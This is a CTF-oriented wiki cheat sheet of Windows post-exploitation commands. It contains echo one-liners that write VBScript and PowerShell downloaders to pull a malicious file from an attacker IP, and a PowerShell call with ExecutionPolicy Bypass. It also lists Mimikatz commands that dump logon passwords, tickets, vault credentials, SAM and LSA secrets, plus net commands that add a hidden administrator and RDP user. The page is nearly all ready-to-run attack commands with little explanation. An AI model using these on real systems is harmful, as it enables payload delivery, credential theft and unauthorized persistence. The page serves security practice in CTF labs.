---
layout: article
title: Windows
permalink: /wikis/ctf/windows
aside:
    toc: true
sidebar:
    nav: wikis
---

## File Transfer
### cscript
If command execution is available and firewalls allow for file transfers: 

cscript.exe is a command-line version of the Windows Script Host that provides command-line options for setting script properties. With cscript.exe, you can run scripts by typing the name of a script file at the command prompt. 

create <b>wget.vbs</b> for vbscript transfer (in a single command) 
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs && echo StrFile = WScript.Arguments.Item(1) >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs && echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs && echo Err.Clear >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs && echo http.Open ^"GET^", strURL, False >> wget.vbs && echo http.Send >> wget.vbs && echo varByteArray = http.ResponseBody >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs && echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs && echo strData = ^"^" >> wget.vbs && echo strBuffer = ^"^" >> wget.vbs && echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs && echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs && echo Next >> wget.vbs && echo ts.Close >> wget.vbs 
```
 
Use cscript to run the wget.vbs script 
```
cscript <script-name> http://<attacker-ip>/<malicious-file> <output-file> 
```


### Powershell
Powershell transfer - red needs to be your own values 
```
echo $storageDir = $pwd> wget.ps1 && echo $webclient = New-Object System.Net.WebClient>> wget.ps1 && echo $url = "http://<attacker-ip>/<malicious-file>">> wget.ps1 

echo $file = "<output-file>">> wget.ps1 

echo $webclient.DownloadFile($url,$file)>> wget.ps1 
```
 
Confirm script creation 
```
type wget.ps1 
```
 
Execute PS script 
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File <scriptname> 
```


## Mimikatz

Extracting information from <b>mimikatz</b> 

```
log 
privilege::debug 
sekurlsa::logonpasswords 
sekurlsa::tickets /export 

vault::cred 
vault::list 

token::elevate 
vault::cred 
vault::list 
lsadump::sam 
lsadump::secrets 
lsadump::cache
```


## Privilege Escalation

Adding users 
```
net user <username> <password> /ADD 
net localgroup administrators <username> /ADD 
net localgroup "Remote Desktop Users" username /ADD 
```
<br>
<br>
Admin to System 
```
at 13:01 /interactive cmd
```